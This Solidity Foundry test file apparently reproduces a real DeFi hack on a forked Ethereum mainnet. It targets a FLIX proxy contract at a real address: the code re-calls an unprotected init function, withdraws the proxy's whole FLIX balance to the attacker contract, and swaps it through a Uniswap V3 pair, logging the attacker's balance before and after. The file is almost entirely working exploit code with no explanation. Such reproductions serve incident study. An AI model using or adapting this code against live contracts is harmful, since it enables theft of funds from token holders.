// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/interface.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Interface
interface IProxy {
    function init(IERC20 initToken, uint256 initPeriods, uint256 initInterval) external;
    function withdraw(IERC20 otherToken, uint256 amount, address receiver) external;
}

contract FLIXTest is Test {
    // Environment Configuration
    uint256 constant forkBlock = 19_196_685;
    address constant fundToken = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    // Variable
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant FLIX = 0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant Victim = 0x2c7112245Fc4af701EBf90399264a7e89205Dad4;
    address constant Pair = 0xa7434b755852F2555D6F96B9E28bAfE92F08Df97;

    // Modifier
    modifier BalanceLog() {
        console.log("Attacker Token Balance Before Exploit: ", getBalance(fundToken));
        _;
        console.log("Attacker Token Balance After Exploit: ", getBalance(fundToken));
    }

    // Balance Log
    function getBalance(address token) internal view returns (uint256) {
        if (token == address(0)) return address(this).balance;
        return IERC20(token).balanceOf(address(this));
    }

    // Environment Setup
    function setUp() public {
        vm.createSelectFork("mainnet", forkBlock);
        vm.deal(address(this), 0);

        vm.label(Victim, "Proxy");
        vm.label(WETH, "WETH");
        vm.label(FLIX, "FLIX");
        vm.label(USDT, "USDT");
        vm.label(Pair, "Uniswap V3 Pair");
    }

    function testExploit() public BalanceLog {
        uint256 initPeriods = 1;
        uint256 initInterval = 1_000_000_000_000_000_000;
        uint256 amount = IERC20(FLIX).balanceOf(Victim);
        IProxy(Victim).init(IERC20(WETH), initPeriods, initInterval);
        IProxy(Victim).withdraw(IERC20(FLIX), amount, address(this));

        address recipient = address(this);
        bool zeroForOne = true;
        int256 amountSpecified = int256(IERC20(FLIX).balanceOf(address(this)));
        uint160 sqrtPriceLimitX96 = 4_295_128_740;
        IUniswapV3Pair(Pair).swap(recipient, zeroForOne, amountSpecified, sqrtPriceLimitX96, "");
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes memory) external {
        IERC20(FLIX).transfer(msg.sender, uint256(amount0Delta));
    }
}
